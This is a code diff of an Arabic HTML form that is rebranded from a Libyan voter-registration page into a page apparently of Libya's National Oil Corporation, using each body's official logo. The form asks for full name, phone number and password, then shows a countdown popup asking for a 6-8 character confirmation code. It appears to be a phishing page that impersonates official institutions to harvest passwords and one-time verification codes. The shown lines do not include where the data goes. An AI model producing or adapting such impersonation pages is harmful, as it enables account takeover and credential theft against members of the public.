@@ -3,11 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>مركز تسجيل الناخبين - ليبيا</title>
+  <title>تسجيل البيانات - المؤسسة الوطنية للنفط</title>
   <style>
     body {
-      font-family: 'Arial', sans-serif;
-      background-color: #f5f5f5;
+      font-family: 'Tahoma', sans-serif;
+      background-color: #ffffff;
       margin: 0;
       padding: 0;
       display: flex;
@@ -17,13 +17,13 @@
     }
 
     .form-container {
-      background-color: #ffffff;
+      background-color: #f7f9fc;
       padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      box-shadow: 0 0 20px rgba(0,0,0,0.08);
       width: 100%;
       max-width: 460px;
-      border-top: 8px solid #003366;
+      border-top: 10px solid #002147;
       position: relative;
     }
 
@@ -33,13 +33,13 @@
     }
 
     .logo img {
-      max-width: 120px;
+      max-width: 100px;
       height: auto;
     }
 
     h2 {
       text-align: center;
-      color: #003366;
+      color: #002147;
       margin-bottom: 25px;
     }
 
@@ -50,7 +50,7 @@
     label {
       display: block;
       margin-bottom: 6px;
-      color: #333;
+      color: #002147;
       font-weight: bold;
     }
 
@@ -74,17 +74,18 @@
     button {
       width: 100%;
       padding: 12px;
-      background-color: #003366;
+      background-color: #d71920;
       border: none;
       color: #fff;
       font-size: 16px;
+      font-weight: bold;
       border-radius: 6px;
       cursor: pointer;
       margin-top: 10px;
     }
 
     button:hover {
-      background-color: #002244;
+      background-color: #b1151a;
     }
 
     .code-popup {
@@ -104,7 +105,7 @@
     .code-popup h4 {
       margin-top: 0;
       margin-bottom: 10px;
-      color: #003366;
+      color: #002147;
     }
 
     .code-popup input {
@@ -124,8 +125,36 @@
 
     .countdown {
       font-size: 14px;
-      color: #555;
+      color: #444;
       margin-bottom: 10px;
+    }
+
+    /* زر 👁️ لحقل الرقم السري */
+    .password-wrapper {
+      position: relative;
+    }
+
+    .password-wrapper input {
+      padding-left: 40px;
+    }
+
+    .toggle-password {
+      position: absolute;
+      top: 50%;
+      left: 10px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #555;
+      font-size: 18px;
+      user-select: none;
+    }
+
+    input[type="date"] {
+      background: url('https://img.icons8.com/ios-glyphs/30/calendar--v1.png') no-repeat left center;
+      background-size: 20px;
+      padding-left: 35px;
+      background-color: #fff;
+      cursor: pointer;
     }
   </style>
 </head>
@@ -133,9 +162,9 @@
 
 <div class="form-container">
   <div class="logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/High_Election_Commission_of_Libya_logo.png/200px-High_Election_Commission_of_Libya_logo.png" alt="شعار مركز الانتخابات">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3d/NOC_Libya_Logo.png" alt="شعار المؤسسة الوطنية للنفط">
   </div>
-  <h2>مركز تسجيل الناخبين - ليبيا</h2>
+  <h2>تسجيل البيانات - المؤسسة الوطنية للنفط</h2>
   <form id="userForm">
     <div class="form-group">
       <label for="name">الاسم الكامل</label>
@@ -167,26 +196,26 @@
     </div>
 
     <div class="form-group">
-      <label for="phone">رقم الهاتف (لإستلام كود التأكيد)</label>
+      <label for="phone">رقم الهاتف</label>
       <input type="tel" id="phone" name="phone" placeholder="2189XXXXXXXX" required />
     </div>
 
-    <div class="form-group">
+    <div class="form-group password-wrapper">
       <label for="password">الرقم السري</label>
       <input type="password" id="password" name="password" placeholder="6 أحرف أو أكثر" required />
+      <span class="toggle-password" onclick="togglePassword()">👁️</span>
     </div>
 
-    <button type="submit">إرسال البيانات</button>
+    <button type="submit">إرسال</button>
   </form>
 </div>
 
-<!-- نافذة الكود -->
 <div class="code-popup" id="codePopup">
   <h4>أدخل كود التأكيد</h4>
   <div class="countdown" id="countdown">08:00</div>
-  <input type="text" id="confirmCode" maxlength="8" placeholder="6 إلى 8 أحرف أو أرقام" />
-  <div class="error" id="codeError">يرجى إدخال كود مكوّن من 6 إلى 8 رموز فقط.</div>
-  <button onclick="validateCode()">تأكيد الكود</button>
+  <input type="text" id="confirmCode" maxlength="8" placeholder="6 إلى 8 رموز" />
+  <div class="error" id="codeError">يرجى إدخال كود من 6 إلى 8 رموز فقط.</div>
+  <button onclick="validateCode()">تأكيد</button>
 </div>
 
 <script>
@@ -202,7 +231,6 @@
 
     const password = document.getElementById('password').value.trim();
 
-    // تحقق من الرقم السري
     if (password.length < 6) {
       alert("الرقم السري يجب أن يكون 6 خانات أو أكثر.");
       return;
@@ -258,6 +286,19 @@
 
       remaining--;
     }, 1000);
+  }
+
+  function togglePassword() {
+    const passwordInput = document.getElementById("password");
+    const toggleIcon = document.querySelector(".toggle-password");
+
+    if (passwordInput.type === "password") {
+      passwordInput.type = "text";
+      toggleIcon.textContent = "🙈";
+    } else {
+      passwordInput.type = "password";
+      toggleIcon.textContent = "👁️";
+    }
   }
 </script>
 
